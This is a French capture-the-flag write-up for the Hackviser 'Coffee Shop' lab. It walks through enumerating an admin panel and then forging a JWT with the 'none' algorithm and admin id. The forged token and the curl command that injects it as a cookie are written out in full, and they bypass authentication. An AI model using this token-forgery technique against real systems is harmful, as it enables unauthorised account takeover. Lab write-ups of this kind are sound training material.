# Coffee Shop (Hackviser CTF) Writeup

## Énumération Initiale

Le défi commence par l'analyse du serveur web cible : `http://lorecoffee.hv/`.
Dès la première énumération avec `dirb`, `ffuf` ou `feroxbuster`, nous découvrons un chemin intéressant : `/adminpanel`.

En accédant à `http://lorecoffee.hv/adminpanel`, nous sommes redirigés vers une page de connexion (`/adminpanel/login`).
Il y a également une page d'inscription accessible à `/adminpanel/register`.

## Création d'un Compte et Analyse

Pour explorer l'application plus en profondeur, nous créons un compte de test depuis le portail d'inscription (`test@test.com` / `password`).
Une fois connectés sur `/adminpanel`, nous recevons le message suivant : **"Your admin account is not verified."**
Nous sommes bien identifiés, mais nous manquons de privilèges pour voir le tableau de bord de l'administrateur.

En inspectant les cookies de session, nous remarquons qu'un cookie nommé `auth` est utilisé et qu'il est au format **JWT** (JSON Web Token).
Si nous décodons ce jeton (par exemple via jwt.io ou avec base64) :

**Header:**

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**

```json
{
  "exp": 1771840832,
  "id": 2
}
```

L'ID `2` correspond à notre utilisateur tout juste créé. On peut logiquement supposer que l'ID administrateur est `1`.

## Escalade de Privilèges : Vulnérabilité JWT (Algorithme "none")

Pour usurper l'identité de l'administrateur, il faudrait modifier le payload pour définir `"id": 1`. Cependant, l'algorithme de signature `HS256` empêche toute falsification du payload sans la clé secrète du serveur.

Pour contourner cela, nous testons une vulnérabilité classique : **l'algorithme "none"** (CVE-2015-9256). Il arrive parfois que les bibliothèques JWT mal configurées acceptent un jeton dont la signature n'est pas vérifiée si le header spécifie `"alg": "none"`.

Nous générons donc un JWT contrefait :

**Header (Base64Url) :** `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0` (décodé: `{"alg":"none","typ":"JWT"}`)
**Payload (Base64Url) :** `eyJpZCI6MX0` (décodé: `{"id":1}`)
**Signature :** *(vide)*

Le token complet est donc composé du header et du payload encodés, séparés par un point, avec un point final pour la signature vide :
`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MX0.`

Nous injectons ce token manuellement dans le cookie `auth` de notre navigateur (ou via une requête CURL) :

```bash
curl -s http://lorecoffee.hv/adminpanel/ -H "Cookie: auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MX0."
```

Cela fonctionne ! Le serveur accepte le token sans effectuer de vérification de signature. Nous contournons l'authentification et accédons au panneau d'administration en tant que `jennifer@lorecoffee.hv`.

## Enquête sur le Hacker

Nous avons maintenant accès à de nouveaux endpoints, dont la liste détaillée des commandes des clients : `/adminpanel/orders`.

**Mise en contexte (Objectif du CTF) :**
> "I can't start my day without the coffee latte I order every morning #LoreCoffee"

Le hacker boit un **Coffee Latte** tous les **matins**.

Nous récupérons tout l'historique des commandes en filtrant les données pour trouver qui commande régulièrement cette boisson spécifique dans la matinée :

```bash
curl -s http://lorecoffee.hv/adminpanel/orders -H "Cookie: auth=$JWT_NONE" > orders.html
```

En analysant le tableau HTML des commandes avec un script Python (ou Excel/grep), nous cherchons un utilisateur qui aurait une forte récurrence d'achats de "Coffee Latte" pendant les heures matinales (ex: "08:00 AM").

Un nom sort immédiatement du lot avec **31 commandes** correspondantes (soit une chaque matin du mois de janvier) : **Michael Brown**.

En regardant sa ligne dans le tableau, nous trouvons toutes ses coordonnées :

- **Full Name :** Michael Brown
- **Email :** <michael.brown@visermail.hv>
- **Phone Number :** 312-555-0198

Le défi est résolu !

## Résumé des objectifs trouvés

* **Admin email :** `jennifer@lorecoffee.hv`
- **Hacker's full name :** `Michael Brown`
- **Hacker's phone number :** `312-555-0198`
